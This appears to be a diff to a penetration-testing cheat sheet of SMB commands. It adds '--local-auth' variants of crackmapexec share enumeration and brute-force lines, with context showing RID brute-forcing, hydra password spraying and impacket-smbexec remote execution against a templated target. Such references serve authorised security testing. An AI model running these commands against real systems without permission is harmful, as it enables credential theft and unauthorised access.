@@ -16,6 +16,7 @@ enum4linux -a -u "" -p "" {{TARGET}}
 
 # === AUTHENTICATED ENUMERATION ===
 crackmapexec smb {{TARGET}} -u {{USER}} -p {{PASS}} --shares
+crackmapexec smb {{TARGET}} -u {{USER}} -p {{PASS}} --shares --local-auth
 crackmapexec smb {{TARGET}} -u {{USER}} -p {{PASS}} --rid-brute
 crackmapexec smb {{TARGET}} -u {{USER}} -p {{PASS}} -d {{DOMAIN}} --continue-on-success
 enum4linux -a -u {{USER}} -p {{PASS}} {{TARGET}}
@@ -40,4 +41,5 @@ impacket-smbexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}}
 
 # === BRUTE FORCE ===
 crackmapexec smb {{TARGET}} -u users.txt -p passwords.txt
+crackmapexec smb {{TARGET}} -u users.txt -p passwords.txt --local-auth
 hydra -V -f -L users.txt -P passwords.txt smb://{{TARGET}}
